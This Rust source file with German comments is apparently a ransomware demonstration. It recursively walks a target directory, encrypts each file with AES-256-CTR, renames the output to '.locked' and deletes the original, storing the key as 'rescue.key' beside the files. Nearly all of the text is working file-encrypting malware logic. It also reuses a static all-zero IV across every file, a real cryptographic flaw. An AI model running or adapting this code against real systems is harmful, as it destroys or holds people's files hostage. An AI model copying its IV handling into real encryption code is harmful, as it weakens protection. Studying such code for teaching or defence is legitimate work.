use aes::cipher::{KeyIvInit, StreamCipher};
use anyhow::{Context, Result};
use rand::{Rng, thread_rng};
use std::{
    fs::{self, File},
    io::{BufReader, BufWriter, Read, Write},
    path::{Path, PathBuf},
};
use walkdir::WalkDir;

// AES-256 im CTR (Counter) Modus
// CTR verwandelt Block-Cipher in Stream-Cipher
type Aes256Ctr = ctr::Ctr64BE<aes::Aes256>;

/// Kryptographisch sicheren 256-Bit Schlüssel + speichert diesen
///
/// # Arguments
/// * `base_path` - Pfad, in dem die Schlüsseldatei `rescue.key` gespeichert werden soll.
///
/// # Returns
/// generierten Schlüssel als 32-Byte Array zurück oder einen Fehler.
fn key_generate_and_save(base_path: &Path) -> Result<[u8; 32]> {
    let mut key = [0u8; 32];
    thread_rng().fill(&mut key);

    let key_path = base_path.join("rescue.key");

    // key in eine Datei schreiben -> Bei Fehler: with_context gibt Fehlermeldung
    fs::write(&key_path, &key)
        .with_context(|| format!("Konnte Schlüsseldatei nicht schreiben: {:?}", key_path))?;

    println!("[+] Schlüssel generiert und gespeichert: {:?}", key_path);
    Ok(key)
}

/// Verschlüsselt eine Datei mit AES-256-CTR
///
/// Funktion nutzt Streaming (puffer), damit auch große Dateien speicherschonend verarbeitet werden
/// können.
/// List chung-weise, verschlüsselt und schreibt in eine temp-Datei
/// Bei Erfolg: Original wird überschrieben.
///
/// # Arguments
/// * `path` - Pfad zur Datei, die verschlüsselt werden soll
/// * `key` - AES-Schlüssel.
/// * `iv` - Initialisierungsvektor
fn encrypt_file_safe(path: &Path, key: &[u8; 32], iv: &[u8; 16]) -> Result<()> {
    let input_file = File::open(path)?;
    let mut reader = BufReader::new(input_file);

    let temp_path = path.with_extension("enc_temp");
    let output_file = File::create(&temp_path)?;
    let mut writer = BufWriter::new(output_file);

    let mut cipher = Aes256Ctr::new(key.into(), iv.into());

    let mut buffer = [0u8; 4096];

    loop {
        let count = reader.read(&mut buffer)?;
        if count == 0 {
            break;
        }

        let chunk = &mut buffer[..count];
        cipher.apply_keystream(chunk);

        writer.write_all(chunk)?;
    }

    // Puffer leeren
    writer.flush()?;

    drop(reader);
    drop(writer);

    // originialdatei mit verschlüsselter ersetzten
    fs::rename(&temp_path, path.with_extension("locked"))
        .context("Fehler beim Umbenennen der verschlüsselten Datei")?;

    if path.exists() {
        fs::remove_file(path).ok();
    }

    println!("    -> Verschlüsselt: {:?}", path.file_name().unwrap());
    Ok(())
}

/// Durchsucht DIR rekursiv und verschlüsselt
///
/// # Arguments
/// * `target_dir` - Root-Dir für den Angriff
pub fn run_malware_demo(target_dir: &str) -> Result<()> {
    let root_path = PathBuf::from(target_dir);
    if !root_path.exists() {
        anyhow::bail!("Zielverzeichnis existiert nicht: {}", target_dir);
    }

    println!("[*] Starte Demo in: {:?}", root_path);

    // Key-Gen
    let key = key_generate_and_save(&root_path)?;

    // Statischer IV
    let iv = [0u8; 16];

    // Rekursiv durch das Filesystem laufen
    let walker = WalkDir::new(&root_path)
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| e.file_type().is_file());

    for entry in walker {
        let path = entry.path();

        if path.ends_with("rescue.key") || path.extension().map_or(false, |ext| ext == "locked") {
            continue;
        }

        match encrypt_file_safe(path, &key, &iv) {
            Ok(_) => {}
            Err(e) => eprintln!("    [!] Fehler bei {:?}: {}", path, e),
        }
    }

    println!("[*] Vorgang abgeschlossen.");
    Ok(())
}
